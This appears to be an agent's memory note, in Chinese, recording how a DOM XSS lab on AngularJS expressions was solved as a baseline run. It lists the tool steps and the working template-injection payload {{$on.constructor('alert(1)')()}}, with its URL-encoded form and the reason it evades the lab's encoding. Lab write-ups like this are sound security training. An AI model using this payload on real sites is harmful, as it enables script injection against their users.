---
metadata:
  node_type: memory
name: "PRS arm A lab-angularjs-expression"
description: "arm A 基线:lab-angularjs-expression 冷实例一次通过 - range_launch launch-url 直取实例,search 参数反射进 ng-app(Angular 1.7.7,无沙箱),payload {{$on.constructor('alert(1)')()}} 由 page_alert 载入即 fired=true,自带 banner 直接 solved(无需 exploit server)"
last_updated: 2026-10-09T01:04:01+08:00
created: 2026-10-09T01:04:01+08:00
---

## 结果
arm A 基线:lab-angularjs-expression 冷实例(reused:false)一次通过,solved。

## 路径
- range_launch launch-url /web-security/cross-site-scripting/dom-based/lab-angularjs-expression --jar /tmp/cj1.json → 实例 0a4a009204a171fb80ce0312002c00af,reused:false,exploit_server:null。
- http_session 取根页:标题「DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded」,`<body ng-app>`,`/resources/js/angular_1-7-7.js`(1.7.7,无 $sce 沙箱),search 表单 GET 反射。
- page_alert `/?search=%7B%7B%24on.constructor('alert(1)')()%7D%7D` → alerts ["alert:1","alert:1"],fired=true。
- banner_verdict 根页 → solved=true,congrats="Congratulations, you solved the lab!"。

## 要点
- 该 lab 无 exploit server(exploit-<id>.exploit-server.net 返回 421 Invalid host,页面内无 exploit 引用);alert 在本机 Chrome 触发即判 solved。
- 载荷 `{{$on.constructor('alert(1)')()}}`:无反尖括号/双引号,契合「angle brackets 与 double quotes 已 HTML 编码」的编码面;Angular 1.7.7 无沙箱,constructor 链不被拦。

